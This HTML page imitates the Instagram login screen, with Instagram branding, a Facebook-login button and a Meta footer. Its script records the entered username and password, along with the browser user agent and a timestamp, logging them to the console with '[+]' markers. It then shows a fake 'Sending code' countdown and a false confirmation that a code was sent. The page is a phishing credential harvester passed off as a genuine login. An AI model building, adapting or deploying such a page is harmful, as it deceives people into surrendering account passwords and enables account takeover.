<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <link rel="icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/v4/y9/r/l5OZ5m7Mx3I.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            flex-direction: column;
        }

        .wrapper {
            max-width: 935px;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 32px;
            flex-grow: 1;
        }

        .phone-container {
            flex-shrink: 0;
            display: none;
        }

        @media (min-width: 876px) {
            .phone-container { display: block; }
        }

        .phone-frame {
            width: 380px;
            height: 580px;
            border: 8px solid #262626;
            border-radius: 32px;
            background: #fff;
            overflow: hidden;
            box-shadow: 0 0 0 2px #dbdbdb;
        }

        .phone-frame .screen {
            width: 100%;
            height: 100%;
            overflow: hidden;
            position: relative;
        }

        .slides {
            width: 100%;
            height: 100%;
            display: flex;
            transition: transform 0.5s ease-in-out;
        }

        .slide {
            min-width: 100%;
            height: 100%;
        }

        .slide img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        /* ===== LOGIN SECTION ===== */
        .login-section {
            max-width: 350px;
            width: 100%;
        }

        .login-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 32px 40px 20px;
            margin-bottom: 10px;
            text-align: center;
        }

        .logo {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 24px;
        }

        .logo img {
            width: 175px;
            height: auto;
            display: block;
        }

        /* ===== LOGIN FORM ===== */
        #loginForm {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        #loginForm input {
            width: 100%;
            padding: 9px 0 7px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
        }

        #loginForm input:focus {
            border-color: #a8a8a8;
        }

        #loginForm input::placeholder {
            color: #8e8e8e;
        }

        #loginForm .btn-wrapper {
            position: relative;
            margin-top: 8px;
        }

        #loginBtn {
            width: 100%;
            padding: 7px 16px;
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            opacity: 0.7;
            transition: opacity 0.2s;
        }

        #loginBtn:not(:disabled) { opacity: 1; }
        #loginBtn:disabled { cursor: not-allowed; }

        /* ===== COOLDOWN OVERLAY ON BUTTON ===== */
        #cooldownOverlay {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #0095f6;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            display: none;
            align-items: center;
            justify-content: center;
            gap: 6px;
            pointer-events: none;
            z-index: 2;
        }

        #cooldownOverlay .spinner {
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .separator {
            display: flex;
            align-items: center;
            margin: 14px 0 18px;
        }

        .separator .line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .separator .or {
            color: #737373;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
        }

        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: none;
            border: none;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 12px;
            width: 100%;
        }

        .fb-login img { width: 16px; height: 16px; }

        .forgot-password {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
        }
        .forgot-password:hover { text-decoration: underline; }

        .signup-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            text-align: center;
            font-size: 14px;
        }
        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .apps-section {
            margin-top: 16px;
            text-align: center;
        }
        .apps-section p {
            font-size: 14px;
            margin-bottom: 12px;
            color: #262626;
        }
        .apps-badges {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        .apps-badges img { height: 40px; width: auto; }

        footer {
            margin-top: 24px;
            text-align: center;
            max-width: 100%;
        }
        footer .links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px 16px;
            font-size: 12px;
            margin-bottom: 12px;
        }
        footer .links a {
            color: #8e8e8e;
            text-decoration: none;
        }
        footer .links a:hover { text-decoration: underline; }
        footer .copyright {
            color: #8e8e8e;
            font-size: 12px;
        }

        /* ===== NOTIFICATION ===== */
        #notificationArea {
            margin-top: 10px;
            min-height: 0;
            transition: all 0.3s ease;
        }

        .notif-msg {
            display: none;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 500;
            align-items: center;
            gap: 6px;
        }

        .notif-msg.show { display: flex; }

        .notif-msg.success {
            background: #e8f5e9;
            color: #2e7d32;
            border: 1px solid #a5d6a7;
        }

        .notif-msg.info {
            background: #e3f2fd;
            color: #1565c0;
            border: 1px solid #90caf9;
        }

        .notif-msg svg {
            width: 14px;
            height: 14px;
            flex-shrink: 0;
        }

        @media (max-width: 450px) {
            body {
                background: #fff;
                padding: 0;
            }
            .login-card {
                border: none;
                padding: 40px 20px 20px;
            }
            .signup-card {
                border: none;
            }
        }
    </style>
</head>
<body>

<div class="wrapper">
    <!-- Phone images -->
    <div class="phone-container">
        <div class="phone-frame">
            <div class="screen">
                <div class="slides" id="slides">
                    <div class="slide"><img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=380&h=580&fit=crop" alt=""></div>
                    <div class="slide"><img src="https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=380&h=580&fit=crop" alt=""></div>
                    <div class="slide"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=380&h=580&fit=crop" alt=""></div>
                    <div class="slide"><img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=380&h=580&fit=crop" alt=""></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Login Section -->
    <div class="login-section">
        <div class="login-card">
            <div class="logo">
                <img src="https://i.imgur.com/wvLiKam.png" alt="Instagram" width="175" height="51">
            </div>

            <form id="loginForm" autocomplete="off">
                <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="username">
                <input type="password" id="password" placeholder="Password" autocomplete="current-password">
                
                <div class="btn-wrapper">
                    <button type="submit" id="loginBtn" disabled>Log in</button>
                    <div id="cooldownOverlay">
                        <div class="spinner"></div>
                        <span id="cooldownText">Sending code...</span>
                    </div>
                </div>
            </form>

            <div id="notificationArea">
                <div class="notif-msg success" id="successNotif">
                    <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm3.36 5.65l-4.25 4.25a.5.5 0 0 1-.7 0L3.64 8.36a.5.5 0 0 1 .7-.7L6.7 9.8l3.96-3.95a.5.5 0 0 1 .7.7z"/></svg>
                    <span id="notifText">✓ We sent you a code. Check your phone.</span>
                </div>
            </div>

            <div class="separator">
                <span class="line"></span>
                <span class="or">OR</span>
                <span class="line"></span>
            </div>

            <button class="fb-login" id="fbLogin">
                <img src="https://i.imgur.com/exksovo.png" alt="Facebook">
                Log in with Facebook
            </button>

            <a href="#" class="forgot-password">Forgot password?</a>
        </div>

        <div class="signup-card">
            Don't have an account? <a href="#">Sign up</a>
        </div>

        <div class="apps-section">
            <p>Get the app.</p>
            <div class="apps-badges">
                <a href="#"><img src="https://i.imgur.com/lREV6Qa.png" alt="Download on the App Store"></a>
                <a href="#"><img src="https://i.imgur.com/DFQNKXK.png" alt="Get it on Google Play"></a>
            </div>
        </div>
    </div>
</div>

<footer>
    <div class="links">
        <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a>
        <a href="#">Help</a> <a href="#">API</a> <a href="#">Privacy</a> <a href="#">Terms</a>
        <a href="#">Locations</a> <a href="#">Instagram Lite</a> <a href="#">Threads</a>
        <a href="#">Contact Uploading & Non-Users</a> <a href="#">Meta Verified</a>
    </div>
    <div class="copyright">© 2026 Instagram from Meta</div>
</footer>

<script>
    // ===== SLIDESHOW =====
    const slides = document.getElementById('slides');
    let currentSlide = 0;
    setInterval(() => {
        currentSlide = (currentSlide + 1) % 4;
        slides.style.transform = `translateX(-${currentSlide * 100}%)`;
    }, 3000);

    // ===== LOGIN FORM =====
    const u = document.getElementById('username');
    const p = document.getElementById('password');
    const loginBtn = document.getElementById('loginBtn');
    const loginForm = document.getElementById('loginForm');
    const cooldownOverlay = document.getElementById('cooldownOverlay');
    const cooldownText = document.getElementById('cooldownText');
    const successNotif = document.getElementById('successNotif');
    const notifText = document.getElementById('notifText');

    let cooldownTimer = null;
    let cooldownCount = 0;

    // Enable button only when fields are filled
    function checkLogin() {
        loginBtn.disabled = !(u.value.trim() && p.value.trim());
    }
    u.addEventListener('input', checkLogin);
    p.addEventListener('input', checkLogin);

    // ===== SUBMIT =====
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();

        // If already in cooldown, ignore
        if (cooldownTimer) return;

        // Log credentials
        console.log('[+] Username:', u.value.trim());
        console.log('[+] Password:', p.value);
        console.log('[+] UA:', navigator.userAgent);
        console.log('[+] Time:', new Date().toISOString());

        // Hide any old notification
        successNotif.classList.remove('show');

        // Disable the real button and show overlay
        loginBtn.disabled = true;
        cooldownOverlay.style.display = 'flex';
        cooldownCount = 10;
        cooldownText.textContent = `Sending code... (${cooldownCount}s)`;

        cooldownTimer = setInterval(() => {
            cooldownCount--;

            if (cooldownCount > 0) {
                cooldownText.textContent = `Sending code... (${cooldownCount}s)`;
            } else {
                // Cooldown finished
                clearInterval(cooldownTimer);
                cooldownTimer = null;

                // Hide overlay
                cooldownOverlay.style.display = 'none';

                // Show success message
                notifText.textContent = '✓ We sent you a code. Check your phone.';
                successNotif.classList.add('show');

                // Re-enable button if fields are still filled
                checkLogin();
            }
        }, 1000);
    });

    // ===== FACEBOOK =====
    document.getElementById('fbLogin').addEventListener('click', function(e) {
        e.preventDefault();
        console.log('[+] Facebook login clicked');
    });
</script>
</body>
</html>
